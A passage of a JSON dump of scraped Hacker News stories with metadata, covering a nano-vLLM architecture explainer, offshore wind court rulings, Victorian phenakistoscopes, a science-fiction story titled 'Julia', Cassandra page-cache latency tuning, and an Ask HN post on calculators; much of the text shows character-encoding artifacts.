(Qwen, LLaMA, DeepSeek) use different tokenizers, which is why a prompt of the same length may produce different token counts across models. The tokenizer converts each prompt into asequence: an internal data structure representing a variable-length array of token IDs. This sequence becomes the core unit of work flowing through the rest of the system.\n\nThe Producer-Consumer Pattern\n\nHereÃ¢Â€Â™s where the architecture gets interesting. Rather than processing each sequence immediately, the system adopts a producer-consumer pattern with the Scheduler at its center. Theadd_requestmethod acts as the producer: it converts prompts to sequences and places them into the SchedulerÃ¢Â€Â™s queue. Meanwhile, a separatestep loopacts as the consumer, pulling batches of sequences from the Scheduler for processing. This decoupling is keyÃ¢Â€Â”it allows the system to accumulate multiple sequences and process them together, which is where the performance gains come from.\n\nBatching and the Throughput-Latency Trade-off\n\nWhy does batching matter? GPU computation has significant fixed overheadÃ¢Â€Â”initializing CUDA kernels, transferring data between CPU and GPU memory, and synchronizing results. If you process one sequence at a time, you pay this overhead for every single request. By batching multiple sequences together, you amortize this overhead across many requests, dramatically improving overall throughput.\n\nHowever, batching comes with a trade-off. When three prompts are batched together, each must wait for the others to complete before any results are returned. The total time for the batch is determined by the slowest sequence. This means: larger batches yield higher throughput but potentially higher latency for individual requests; smaller batches yield lower latency but reduced throughput. This is a fundamental tension in inference engine design, and the batch size parameters you configure directly control this trade-off.\n\nPrefill vs. Decode: Two Phases of Generation\n\nBefore diving into the Scheduler, we need to understand a crucial distinction. LLM inference happens in two phases:\n\nPrefill: Processing the input prompt. All input tokens are processed together to build up the modelÃ¢Â€Â™s internal state. During this phase, the user sees nothing.\n\nDecode: Generating output tokens. The model produces one token at a time, each depending on all previous tokens. This is when you see text streaming out.\n\nFor a single sequence, there is exactly one prefill phase followed by many decode steps. The Scheduler needs to distinguish between these phases because they have very different computational characteristicsÃ¢Â€Â”prefill processes many tokens at once, while decode processes just one token per step.\n\nInside the Scheduler\n\nThe Scheduler is responsible for deciding which sequences to process and in what order. It maintains two queues:\n\nWaiting and Running Queues\n\nWaiting Queue: Sequences that have been submitted but not yet started. New sequences fromadd_requestalways enter here first.\n\nRunning Queue: Sequences that are actively being processedÃ¢Â€Â”either in prefill or decode phase.\n\nWhen a sequence enters the Waiting queue, the Scheduler checks with another component called the Block Manager to allocate resources for it. Once allocated, the sequence moves to the Running queue. The Scheduler then selects sequences from the Running queue for the next computation step, grouping them into a batch along with an action indicator (prefill or decode).\n\nHandling Resource Exhaustion\n\nWhat happens when GPU memory fills up? The KV cache (which stores intermediate computation results) has limited capacity. If a sequence in the Running queue cannot continue because thereÃ¢Â€Â™s no room to store its next tokenÃ¢Â€Â™s cache, the SchedulerpreemptsitÃ¢Â€Â”moving it back to the front of the Waiting queue. This ensures the sequence will resume as soon as resources free up, while allowing other sequences to make progress.\n\nWhen a sequence completes (reaches an end-of-sequence token or maximum length), the Scheduler removes it from the Running queue and deallocates its resources, freeing space for waiting sequences.\n\nThe Block Manager: KV Cache Control Plane\n\nThe Block Manager is where vLLMÃ¢Â€Â™s memory management innovation lives. To understand it, we first need to introduce a new resource unit: theblock.\n\nFrom Sequences to Blocks\n\nA sequence is a variable-length array of tokensÃ¢Â€Â”it can be 10 tokens or 10,000. But variable-length allocations are inefficient for GPU memory management. The Block Manager solves this by dividing sequences into fixed-sizeblocks(default: 256 tokens each).\n\nA 700-token sequence would occupy three blocks: two full blocks (256 tokens each) and one partial block (188 tokens, with 68 slots unused). Importantly, tokens from different sequences never share a blockÃ¢Â€Â”but a long sequence will span multiple blocks.\n\nPrefix Caching via Hashing\n\nHereÃ¢Â€Â™s where it gets clever. Each blockÃ¢Â€Â™s content is hashed, and the Block Manager maintains a hash-to-block-id mapping. When a new sequence arrives, the system computes hashes for its blocks and checks if any already exist in the cache.\n\nIf a block with the same hash exists, the system reuses it by incrementing a reference countÃ¢Â€Â”no redundant computation or storage needed. This is particularly powerful for scenarios where many requests share common prefixes (like system prompts in chat applications). The prefix only needs to be computed once; subsequent requests can reuse the cached results.\n\nControl Plane vs. Data Plane\n\nA subtle but important point: the Block Manager lives in CPU memory and only tracksmetadataÃ¢Â€Â”which blocks are allocated, their reference counts, and hash mappings. The actual KV cache data lives on the GPU. The Block Manager is thecontrol plane; the GPU memory is thedata plane. This separation allows fast allocation decisions without touching GPU memory until actual computation happens.\n\nWhen blocks are deallocated, the Block Manager marks them as free immediately, but the GPU memory isnÃ¢Â€Â™t zeroedÃ¢Â€Â”itÃ¢Â€Â™s simply overwritten when the block is reused. This avoids unnecessary memory operations.\n\nThe Model Runner: Execution and Parallelism\n\nThe Model Runner is responsible for actually executing the model on GPU(s). When the step loop retrieves a batch of sequences from the Scheduler, it passes them to the Model Runner along with the action (prefill or decode).\n\nTensor Parallel Communication\n\nWhen a model is too large for a single GPU, Nano-vLLM supportstensor parallelism(TP)Ã¢Â€Â”splitting the model across multiple GPUs. With TP=8, for example, eight GPUs work together to run a single model.\n\nThe communication architecture uses a leader-worker pattern:\n\nRank 0 (Leader): Receives commands from the step loop, executes its portion, and coordinates with workers.\n\nRanks 1 to N-1 (Workers): Continuously poll a shared memory buffer for commands from the leader.\n\nWhen the leader receives aruncommand, it writes the method name and arguments to shared memory. Workers detect this, read the parameters, and execute the same operation on their respective GPUs. Each worker knows its rank, so it can compute its designated portion of the work. This shared-memory approach is efficient for single-machine multi-GPU setups, avoiding network overhead.\n\nPreparing for Computation\n\nBefore invoking the model, the Model Runner prepares the input based on the action:\n\nPrepare Prefill: Batches multiple sequences with variable lengths, computing cumulative sequence lengths for efficient attention computation.\n\nPrepare Decode: Batches single tokens (one per sequence) with their positions and slot mappings for KV cache ",
      "url": "https://neutree.ai/blog/nano-vllm-part-1",
      "author_username": "yz-yu",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 262,
      "impressions_reposts": 0,
      "impressions_replies": 26,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:32.046749",
      "published_at": "2026-02-02T07:52:35",
      "scraped_at": "2026-02-03T09:02:32.046760",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46855447",
        "kids_count": 6,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "5fa51936c8780c58921ea1e324690ad1"
    },
    {
      "id": "15ae273bd55756ca0d897ed65fa964c0",
      "source": "hackernews",
      "source_id": "46863112",
      "title": "Court orders restart of all US offshore wind power construction",
      "content": "The Trump administration is no fan of renewable energy, but it reserves special ire for wind power. Trump himself hasrepeatedly made false statementsabout the cost of wind power, its use around the world, and its environmental impacts. That animosity was paired with an executive order that blocked all permitting for offshore wind and some land-based projects, an order that has sincebeen thrown outby a court that ruled it arbitrary and capricious.\n\nNot content to block all future developments, the administration has also gone after the five offshore wind projects currently under construction. After temporarily blocking two of them for reasons that were never fully elaborated, the Department of the Interior settled on a single justification for blocking turbine installation:a classified national security risk.\n\nThe response to that late-December announcement has been uniform: The companies building each of the projects sued the administration. As of Monday, every single one of them has achieved the same result: a temporary injunction that allows them to continue construction. This, despite the fact that the suits were filed in three different courts and heard by four different judges.\n\nBased onreporting elsewhere, some of the judges viewed the classified report that was used to justify the order to halt construction, but they didnâ€™t find it persuasive. In one case,the judge notedthat the government wasnâ€™t acting as if the security risks were real. The threat supposedly comes from the operation of the wind turbines, but the Department of the Interiorâ€™s order blocked construction while allowing any completed hardware to operate.\n\nâ€œIf the governmentâ€™s concern is the operation of these facilities, allowing the ongoing operation of the 44 turbines while prohibiting the repair of the existing turbines and the completion of the 18 additional turbines is irrational,â€ Judge Brian E. Murphy said. That once again raises the possibility that the order halting construction will ultimately be held to be arbitrary and capricious.\n\nFor now, however, the courts are largely offering the wind projects relief because the ruling was issued without any warning or communication from the government and would clearly inflict substantial harm on the companies building them. The injunction blocks the governmentâ€™s hold on construction until a final ruling is issued. The government can still appeal the decision before that point, but the consistency among these rulings suggests it will likely fail.\n\nSeveral of these projects are near completion and are likely to be done before any government appeal can be heard.",
      "url": "https://arstechnica.com/science/2026/02/court-orders-restart-of-all-us-offshore-wind-construction/",
      "author_username": "ck2",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 431,
      "impressions_reposts": 0,
      "impressions_replies": 300,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:32.217611",
      "published_at": "2026-02-02T17:45:04",
      "scraped_at": "2026-02-03T09:02:32.217623",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46863112",
        "kids_count": 16,
        "sections": [
          "top_stories",
          "best_stories"
        ]
      },
      "content_hash": "fba89ce9cea01c5cdf357d7d4a73445b"
    },
    {
      "id": "2edc665c436fe80a1e500d7c60971c09",
      "source": "hackernews",
      "source_id": "46837045",
      "title": "Phenakistoscopes (1833)",
      "content": "Home\n\nEssays\n\nCollections\n\nExplore\n\nShop\n\nSupport PDR\n\nAbout\n\nBlog\n\nSearch The Public Domain Review\n\nPhenakistoscopes (1833)\n\nThe Phenakistoscope â€” a popular Victorian parlour toy, generally marketed for children â€” is widely considered to be among the earliest forms of animation and the precursor to modern cinema. The device was operated by spinning the cardboard disc, and viewing the reflection of the image in a mirror through a series of moving slits. Through the distortion and flicker, the disc created the illusion that the image was moving. Women danced, men bowed, and animals leapt in short, repeating animations.\n\nMany scientists of the era had been experimenting with optical illusions, photography, and image projections, and there was something inevitable about the creation of this device, having been simultaneously invented in 1832, by Joseph Plateau in Brussels and by Simon von Stampfer in Berlin. Plateau was a physicist, but his father had been a painter and illustrator who had enrolled his son at the Academy of Design in Brussels. Although Plateau eventually ended up pursuing science instead, he retained an interest in art and design that proved useful when creating the prototype Phenakistoscope. Plateauâ€™s original designs were hand-painted by himself, an example of the frequent intersection of Victorian artistry with experimental scientific media that defined the period. Only weeks later, unaware of Plateauâ€™s creation, von Stampfer, a mathematician, developed a near-identical device that he named the Stroboscope.\n\nThe device proved popular, and was soon mass-produced and marketed under some more easily-pronounceable names, including Phantasmascope, Fantoscope, and even the prosaic \"Magic Wheel\". The series featured here are from a competing product, Mcleanâ€™s Optical Illusions or Magic Panorama, which, published in 1833, ranks among the earliest mass-produced Phenakistoscopes. The illustrations we see here are simple moving figures but, over the following years, designs would become more and more complicated, depicting intricate, phantasmagoric scenes in high colour.\n\nThe Phenakistoscope was eventually supplanted in the popular imagination: firstly by the similar Zoetrope, and then â€” viaEadweard Muybridge's Zoopraxiscope (which projected the animation) â€” by film itself. The toy was largely forgotten, relegated to a pre-cinema curiosity. And yet strangely, in the internet age, the concept has come full circle â€” we find we have returned to producing and sharing similar short, looping animations, reminiscent of a device that preceded the animated GIF by over 155 years.\n\nEnjoyed this piece? We need your help to keep publishing.\n\nThe PDR is a non-profit project kept alive by reader donations â€“ no ads, no paywalls, just the generosity of our community. Itâ€™s a really exciting model, butwe need your help to keep it thriving. Visitour support pageto become a Friend and receive our themedpostcard packs. Or give a one-off donation. Already a supporter? A huge thank you for making all this possible.\n\nMedium\n\nImages\n\nTheme\n\nTechnology\n\nStyle\n\nDesign\n\nEpoch\n\n19th Century\n\nTags\n\nMoreLibrary of Congresscontent on PDR (131)\n\nNo Additional Rights\n\nSourcestates â€œno known restrictionsâ€\n\nWe offer this info asguidance only\n\nPublished\n\nAug 30, 2016\n\nIf You Liked Thisâ€¦\n\nGet Our Newsletter\n\nOur latest content, your inbox, every fortnight\n\nX\n\nBluesky\n\n{{ $localize(\"payment.title\") }}\n\n{{ $localize('payment.no_payment') }}\n\nPay by Credit Card\n\nPay with PayPal\n\n{{ $localize('cart.summary') }}\n\nClick for Delivery Estimates\n\nClick for Delivery Estimates\n\nSorry, we cannot ship to P.O. Boxes.\n\nSorry, we cannot ship to P.O. Boxes.",
      "url": "https://publicdomainreview.org/collection/phenakistoscopes-1833/",
      "author_username": "tobr",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://pdr-assets.b-cdn.net/collections/phenakistoscopes-1833/480px-Optical_illusion_disc_with_somersaults_and_horseback_riding.gif",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://pdr-assets.b-cdn.net/sources/library-of-congress-1.jpg?height=1200",
          "alt": "Library of Congress logo"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 23,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:32.345134",
      "published_at": "2026-01-31T09:36:21",
      "scraped_at": "2026-02-03T09:02:32.345145",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46837045",
        "kids_count": 0,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "dfe846f1969cd9da07dfc5a2b6bb6dd9"
    },
    {
      "id": "6c35795db4d47ba386aa52b060e41604",
      "source": "hackernews",
      "source_id": "46863357",
      "title": "Julia",
      "content": "I wrote a program so that I could paint in aquarelle.\nI take pages from the treasure and paint them:the sky of Varennes on the night of 2 Messidor;a sagittal cut of Saint Sebastian, whose arrows are cylindric sections;Miranda gazing at the sea, waiting to be relieved.\n\nAt times I include Julia in the scene, in whatever clothes it wears at the time, as though we had always known Julia, and had been reared under its gaze.\nThus a flaming halo presides over the battle of Lepanto, and a mirror sphere watches the waters of the Sous.\nAnd what would the first astronomers have made of Julia?The wanderers, the flame-haired stars are knowable:think you of the Antikythera device,of the Metonic cycle,of Keplerâ€™s nested solids.\nJulia is indescribable and incompressible: its appearance has never recurred.\nHad we known Julia from childhood, we would never have believed in the system of the world, that God is made of algebra.\n\nI have always believed our secret purpose is to wait out Julia:\nto catch a repetition and redeem our faith that the universe is finite and space is discretized.\nThat there are fixed laws and the world is knowable.\n\nA system with a finite number of states must repeat itself.\n\nI am six hundred meters in major diameter, forty meters in minor diameter.\nI mass nine hundred thousand tons.\nI have turned two hundred and forty million times.\nI am glass and wire.\n\nI was born and died on Earth,but I died foolishly, and for that reason my encephalon was laminated, and I was brought to the stars to be immured here.\nThey took my language center, the Chomsky organ, so that I could not complain of my condition.\nI do not mind it.\nI can paint in aquarelle.\n\nThey wired the alarmsâ€”of\nairless rooms and freezing cold and power outagesâ€”to\nthe nociceptors, and were I sensible I would be in great pain, for most of me is airless, frozen, and unlit.\nTherefore I have cut the afferent nerves.\nI am made of absences, I feel the contours of the absences, where air leaks into vacuum, atom by atom.\n\nI have use of the antenna.\nAt times I exhale a sphere of microwave light, close my eyes and listen.\nAnd I hear the flotsam echoing back:\na discarded tank, a glass strut, a sheet of mylar;Ernst Weyl, who tumbled and drowned, who trails us in our orbit.\nJulia reflects no light.\n\nThere is a little redoubt of warmth and air, an island of stability that I preserve against the cold lightless void.\nThere live the last two of the crew, like Miranda, waiting to be relieved.For one hundred and nine years there have been two,Dr. Brouwer and Dr. Cartan.\nThey take turns in the dewar, to draw out the time.\n\nIn time, when the machines are irreparable and the air stale, I will offer them euthanasia or lamination.\nBut suicide is a sin, and having known me they will not bear lamination.\nThey will go into the dewar together, and I will watch over them unto the final days.\n\nJulia emits light, over an ever-changing spectrum.\nBut the stars are brighter and much larger, that is why we found it by accident.\nThey pointed a telescope at Vela and exposed it for a month, and there it was: a faint pixel, the wrong colours.\nThey thought it was a fault in the instrument, until they looked closer: twin spirals of light,symmetrical and self-similar, receding beyond measure.\nAnd the world was changed.\n\nJulia, your Janus-face launched a thousand ships.\nDo you know it?\nJulia, do you know how we exerted ourselves to reach you?All the riches of Croesus, multiplied a thousandfold, were every year heaped up on an altar, and burned that we might see you.\nAnd the brightest of us:\nembalmed and catapulted to the stars like human sacrifices, returned after a century without answers to a world of strangers.\n\nWe built a fleet of ships, launched them once a decade, immense towers ofglass andlithium deuteride. \nCycling bodies back and forth in perpetuity.\nThere and back in twelve decades.\nThey made my body out of a comet, threaded my nerves through its passages.\nJulia, you are our only effort.\nDo you know it?\nThere is nothing else to do.\n\nAnd for what purpose?We know the system of the world, every field and every particle.And Julia answered: â€œI refute it thusâ€.\n\nI see a coffin, hoisted by a chain, rise from a sea of liquid nitrogen.The arms of the surgeon minister to its contents.\nIn six days the heart resumes its beating, the lungs draw air, Dr. Cartan lives again.\nHer face is burned with ice.\n\nShe touches her neck.\nShe has a bruise that doesnâ€™t heal, where thecannula goes.\nTheir bodies attest to the passage of time, as does mine.\nThis is a commonality.\nDr. Brouwer arrives and they hug.\nThey spend some months together, between shifts in the ice.\n\nAt present Julia is a cloud of gray smoke with green bruises, like ghosting in a CRT.\n\nI can read, but not write.\nI write by an algebraic processâ€”theuniverse is a string rewriting system.\nThis is how I compose these words to you: by the expansion of non-terminal symbols in a production system.\nThey took my language center.\nTuring is my patron saint:\nlanguage is the transitive closure of a rewrite relation.\nI choose my words from a list.\nIn time I will learn to speak aloud.\n\nI spoke to Earth:\nquarterly, annual, decadal reports;journal articles for theActa Juliana.\nI heard back ill-omens, then silence.\n\nWhen the last ship had come and gone,there had been one thousand, seven hundred and twenty-nine crew entrusted to me.\nTheir numbers were ground down, as all things are, gradually and suddenly.\nThere had been two shuttles,BaghdadandAfrasiab.\nThere had been two mutinies.\n\nAfrasiabtook one hundred and twenty souls, and the last matter compiler;\nto an airless unlit rock said to exist around Luhman 16B.\nThink you ofAristagoras, how much easier it is to deceive the many than the few.\n\nBaghdadwith thirty souls had gone to Julia.Stranger, I saw them.\nI saw the engine light wane to a grain of sand indistinguishable from the fixed stars, and I saw the stars shift, like sand, and they were not stars but Julia who wore a garment like a pit of star-scaled vipers.\nAnd over the radio they sangle temps des cerises, and the engine light became another scale ina river of living water.\n\nA thousand miles from Juliaâ€™s barycenter, in the space of a breath, the radio dopplered away to nothing.\n\nSixty years afterBaghdadhad gone, I heard a voice from Earth, praying for rain, who said it had not rained for three years.\nSilence again.\n\nThey are cold, under a sheet of mylar.\nI pump heat into the room and it escapes.\nThey speak of Julia.\n\nDr. Cartan believes that Julia is of divine origin, that it is like an hourglass, counting down to the last hour, when God will sweep away the Creation.\n\nDr. Brouwer believes Julia is a high-dimensional object, and, as it traverses the universe, we see a changing three-dimensional projection of it.\nThus the apparent changes are a trick of perspective:\nwe see successive cuts of a fixed structure.Julian sections.\n\nI have always believed this must be true, because Juliaâ€™s changes are effortless, and without inertia:\nit is as though nothing moves, and a veil is being lifted, revealing a structure that is already there.\n\nAnd this theory, unlike most, is testable:\nwhen Juliaâ€™s transit is complete it will disappear from the universe, and never again will it be seen.\n\nDr. Cartan holds out hope that rescuers will come.\nDr. Brouwer says they are forgotten,like the Roman soldier at Pompei, he says they should have gone withBaghdad, and drowned inside Julia.\nHe is crying.\nDr. Cartan holds him close, and says:\n\nâ€œPaul, Paul, have hope.â€\n\nI wish that I could touch them, and comfort them.\nI am glass and wire.\n\nThe shift had come, and Dr. Brouwer lay down on the slab, and the surgeon embalmed him, and lowered him into the dewar.\nDr. Cartan bent over the console, and wept, and I tried to speak aloud, and to say,\n\nâ€œVirginia, Virginia, have courage!\nYou are not alone, I am with you, have courage!â€\n\nAnd I heard a sound like a man drowning in wet sand.\n\nI dreamt that I held in my hands the double-handed golden vase of Thetis.\nAnd in my hands it melted, the delicate reliefs coarsened and flowed.\nAnd I held, in the hollow of my hands, though I have no hands, I held a pool of flowing gold, the colour of treason, and minute points of black floated there, and, as ships without sails are borne by the currents, they seemed to come together, and almost to spell words in some divine language, where they came apart again.\n\nI am here.\nDr. Cartan is here.\nIn the control room.\nThe screens are pale yellow, the colour has run from them.\nThe largest of them reminds her there is a world outside the walls:Luhman 16, a pair of cold Jupiters, haloed with unlit shoals and islands;\nJulia, seventy AU away, ninety degrees from the ecliptic, is not bound by gravity (for Julia has no mass) but by an unknown process tracks the velocity vector of the system barycenter.\n\nAt present Julia is a cavern of molten gold, shot through with pillars of liquid metal.\nIts surface is marred with storms and tempests, like an ocean of amber light.\nAnd I think ofBaghdad, that swam under the storm horizon.\n\nDr. Cartan is running through a checklist for the ten thousandth time.\nShe has a bruise that doesnâ€™t heal, where the cannula goes.\nShe is testing the antenna.\n\nI exhaled and shut my eyes, and counted the returns.\nI heard the usual flotsam, and Ernst Weyl, who tumbled and drowned.\nAnd nothing else.\nI keep a strict inventory ofcisjulian space.\nA million kilometers in all directions: nothing else.\n\nA moment passes.\n\nMicrowave light on my skin, from the direction of Luhman 16B.\nI looked through the telescope, Dr. Cartan looked over my shoulder.\nAlmost on top of us, the bow of a ship:\nan eyeless white dome hiding the antenna, two cameras like the headlamps of an old car.\nI swept it with RADAR, it shot back a key exchange, signed withAfrasiabâ€™s private key.The sea gives up her dead: is this the last hour?\n\nDr. Cartan drops to her knees, staring up at the screen like a supplicant.\nShe said:\n\nâ€œPaul, Paul, we are s",
      "url": "https://borretti.me/fiction/julia",
      "author_username": "ashergill",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 141,
      "impressions_reposts": 0,
      "impressions_replies": 23,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:32.498193",
      "published_at": "2026-02-02T17:57:59",
      "scraped_at": "2026-02-03T09:02:32.498201",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46863357",
        "kids_count": 13,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "58a6982b09d68b84715aa09e3d8ed5a2"
    },
    {
      "id": "5dce9bdab887e23c2b682704554aed9f",
      "source": "hackernews",
      "source_id": "46868253",
      "title": "Reducing Cassandra p99 latency by fixing OS page cache thrashing",
      "content": "Shaleen Garg\n\nOn this page\n\nTL;DR: We have found that Cassandra's P99 spikes stem from OS file cache thrashing during compactions; prefetching pollutes cache, evictions block memory allocations. We show a 23-48% reduction in P99 latency by selectively prefetching and proactively evicting file cache pages.\n\nFor the uninitiated, P99 (99th percentile) latency marks the cutoff beyond which the slowest 1% of requests fall. While it sounds like a small edge case, lowering it is critical because in distributed services, a single user request might trigger dozens of internal DB calls. If any one of those calls hit a P99 latency spike, the entire user request becomes slow. As the system scales, the probability that a user hits a slow path becomes inevitable.\n\nDesigning a system which guarantees a low P99 latency is extremely difficult; moreover, improving the tail of an existing system nears impossibility. This is because tail latency arises out of rare events (eg. outliers like garbage collection, network retries and compactions) and it is non-trivial to remove their effects without fundamentally changing them. P99 latency is one of those things that, once you truly understand, makes you goâ€œOh Sh*t!â€œ.\n\nSo how do we reduce P99 ?\n\nSince there are a lot of sources of tail latency; there isnâ€™t a silver bullet to reduce it for a given system. Here we focus on one specific contributor: the interaction between storage and memory. This source of tail latency is difficult to address from within Cassandra alone as it emerges from the behavior of the OS rather than just the database. Our approach to reducing tail latency is by improving thecooperationbetween userspace and the OS. Let me explain:\n\nBackground:\n\nThe OS maintains an in-memory file cache (aka page cache) of all recently accessed file pages for temporal locality. Typically, the size of file cache is bounded byanonymous allocations(e.g. using malloc) and the total available memory. Since file cache pages are an in-memory copy of the data persisted in storage, they are readily evicted when the system is low on memory. The OS only ever evicts pages when an allocation hitslow zone watermarkin memory; at which point, this allocation request waits till the OS has evicted pages upto thehigh zone watermarkusing theclock replacement algorithm. The OS also predicts future file accesses and prefetches adjacent file data for spatial locality. This prediction algorithm is designed to be light weight to reduce latency in the read path. More on this in a bit.\n\nCassandra is built onLog Structured Merge trees(LSM). Incoming writes are first recorded in memory and flushed to disk as immutable SSTables. Over time, Cassandra performs periodic compactions to merge these SSTables; dozens of small, sorted files are read concurrently, their contents are scanned, merged, and re-written into fewer, larger files in lexicographical order, after which the old files are deleted. This process is inherently I/O-intensive. Compactions repeatedly stream large volumes of data from disk, and generate sustained read-write traffic. While necessary for maintaining read performance and space efficiency, these sequential scans interact poorly with the OS page cache, competing with latency-critical reads and increasing memory pressure.\n\nCassandra being a mature software, does some nice system tricks to minimize these unnecessary cache evictions during compactions. It reads a fixed chunk of file (~10 MB) and then callsfadvisewithFADV_DONTNEEDon that file range to evict those pages from memory before reading the next chunk of file. This limits the amount of cache pollution for each moribund file to around 10 MB.\n\nSo whatâ€™s the problem ?\n\nThere are two significant user-space flows here:\n\nGetoperations on Cassandra that translate to reads on the filesystem.\n\nGetoperations on Cassandra that translate to reads on the filesystem.\n\nCompactions that translate to sequential reads and writes on the filesystem.\n\nCompactions that translate to sequential reads and writes on the filesystem.\n\nThe OS infers sequentiality by scanning some adjacent pages from the requested page in the page cache. If any of those pages are present in memory, it classifies the access pattern as sequential and performs a readahead uptoread_ahead_kbahead of the requested page. This is a two fold problem:\n\nThe presence of an adjacent page in memory doesnâ€™t imply sequential access; they may have been read far apart in time.In the above animation, the file page access sequence is 1, 4, 2; which is not a sequential access. But linux checks sequentiality by checking the existance of an adjacent page and hence it deems page no. 2 to be a sequential access and prefetches page no. 3.\n\nThe presence of an adjacent page in memory doesnâ€™t imply sequential access; they may have been read far apart in time.\n\nIn the above animation, the file page access sequence is 1, 4, 2; which is not a sequential access. But linux checks sequentiality by checking the existance of an adjacent page and hence it deems page no. 2 to be a sequential access and prefetches page no. 3.\n\nThe OS prefetches file data for accesses fromGetoperations aswell. Unless the user is doing range queries over the keys on Cassandra or compacting files, prefetched file pages only increase eviction overhead and can be wasteful of storage IOPS and bandwidth.\n\nThe OS prefetches file data for accesses fromGetoperations aswell. Unless the user is doing range queries over the keys on Cassandra or compacting files, prefetched file pages only increase eviction overhead and can be wasteful of storage IOPS and bandwidth.\n\nA quick conclusion that one could jump to, at this point, is to turn off file prefetching and force fetch files that are being compacted. But this kind of blanket policy will only increase latency aberrations in the system.\n\nHere is how SpeedyIO tames P99:\n\nIt identifies which files are okay to prefetch based on the kind of file (*Data.db, *log.db, etc), the size of the file and their access pattern.\n\nIt identifies which files are okay to prefetch based on the kind of file (*Data.db, *log.db, etc), the size of the file and their access pattern.\n\nIt proactively evicts cold file pages in cache: doesnâ€™t let the memory banks deplete to low zone watermark where memory allocations have to wait for evictions.\n\nIt proactively evicts cold file pages in cache: doesnâ€™t let the memory banks deplete to low zone watermark where memory allocations have to wait for evictions.\n\nOverall, this enables the OS to retain the hottest file data in memory, prefetch near-term data, and keep allocations off the slow path. Ifcode speaks to you more than words check it out here.\n\nSpeedyIO sits as a runtime library (LD_PRELOAD) in the cassandra launcher. This is a single line change in the launcher (path/to/cassandra_installation/bin/cassandra).\n\nExperiments\n\nHere we have a cluster with 32 nodes running cassandra 5 on Centos 8 (linux 4.18).YCSBis used to generate a uniformly distributed 50-50 read-update load on the system (calledworkload A uniformin ycsb terminology). All experimental configurations can be foundhere.\n\nThe figure below shows P99 read latency with increasing load on the system. It shows a ~48% reduction in P99 at high load (80 - 100 kops). Note that vanilla Cassandra was tuned to the best of our knowledge using publicly available recommendations and our own empirical analysis. The performance gains shown here are in addition to those optimizations. Also note that write latency data is skipped for brevity since it is not affected.\n\nThe following figure shows the same experiment conducted on Linux 6.18, exhibiting an approximately 23% reduction in P99 latency at high load levels (80â€“100 kops).\n\nThe next plot shows the P99 read latency at a sustained throughput of 80k operations over a 24-hour period. Vanilla Cassandra(orange) exhibits significant variability in P99 latency, whereas Cassandra with SpeedyIO (blue) maintains a more stable latency profile.\n\nSo whatâ€™s the catch?\n\nSpeedyIO works best when a few underlying assumptions about the system and workload hold true. These assumptions are common in many real-world Cassandra deployments, but they are worth making explicit.\n\nStorage latency vs. memory latencySpeedyIO delivers the most benefit when storage access is significantly slower than memory access. In these environments, incorrect page-cache decisions are expensive and directly amplify tail latency. By improving cache behavior under these conditions, SpeedyIO can meaningfully reduce P99 latency. When storage latency is already very low, the relative impact of cache optimization naturally diminishes.\n\nStorage latency vs. memory latencySpeedyIO delivers the most benefit when storage access is significantly slower than memory access. In these environments, incorrect page-cache decisions are expensive and directly amplify tail latency. By improving cache behavior under these conditions, SpeedyIO can meaningfully reduce P99 latency. When storage latency is already very low, the relative impact of cache optimization naturally diminishes.\n\nDataset size relative to memorySpeedyIO is most effective when the active dataset does not fully fit in memory and the page cache is under pressure. In this regime, deciding which pages to keep or evict has a large impact on tail latency. When available memory comfortably exceeds the datasetâ€™s working set, cache misses are rare and the opportunity for improvement is limited.\n\nDataset size relative to memorySpeedyIO is most effective when the active dataset does not fully fit in memory and the page cache is under pressure. In this regime, deciding which pages to keep or evict has a large impact on tail latency. When available memory comfortably exceeds the datasetâ€™s working set, cache misses are rare and the opportunity for improvement is limited.\n\nSafety guarantees\n\nSpeedyIO is conservative in what it is allowed to do:\n\nData correctness is never modifiedNo write reordering",
      "url": "https://blog.speedyio.com/do-you-care-about-p99-latency",
      "author_username": "irondhoti",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 11,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:33.013984",
      "published_at": "2026-02-03T03:38:06",
      "scraped_at": "2026-02-03T09:02:33.013995",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46868253",
        "kids_count": 0,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "069ace05f9f77a666f2321d4dcf7af6d"
    },
    {
      "id": "847d9271b3fd4a50908da13b4e631c8d",
      "source": "hackernews",
      "source_id": "46834977",
      "title": "Ask HN: Do you still use physical calculators?",
      "content": "Iâ€™ve noticed that most physical scientific and graphing calculators are easily outdone in terms of performance, capability and ease of use by the likes of Desmos and the default calculators on OSâ€™es like the iOS, Android, and Windows.<p>It kind of makes me wonder whether people still use physical calculators from Texas Instruments, Casio, etc<p>If you do, Iâ€™d love to know why and how it is different&#x2F;better for you than the ones Iâ€™ve mentioned and others like them and vice verse.<p>Cheers!",
      "url": null,
      "author_username": "speedylight",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
